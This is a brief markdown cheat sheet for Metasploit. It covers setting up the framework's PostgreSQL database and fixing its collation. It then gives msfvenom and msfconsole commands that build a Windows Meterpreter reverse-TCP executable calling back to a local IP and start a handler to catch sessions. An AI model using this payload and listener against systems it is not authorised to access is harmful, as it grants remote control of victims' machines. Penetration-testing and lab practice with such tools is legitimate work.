DB
--- 

__msf db init:__  
>
> sudo systemctl enable postgresql  
> sudo systemctl start postgresql  
> sudo msfdb init  
>
> msfconsole -q  
> `msf > db_status`

__upd msf pg collation:__  
>
> sudo -u postgres psql  
> `# \l`  
> `# \c msf`  
> `# REINDEX DATABASE msf;`  
> `# ALTER DATABASE msf REFRESH COLLATION VERSION;`  
> `# \q`  

MTR
---

https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/

> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 --format=exe > _mtr100.exe  

> msfconsole -q  
>
> `msf > use exploit/multi/handler`    
>
> `msf > set PAYLOAD windows/meterpreter/reverse_tcp`  
> `msf > set LHOST 192.168.0.100`    
> `msf > set LPORT 4444`    
> `msf > set ExitOnSession false`    
> `msf > exploit -j`

---

  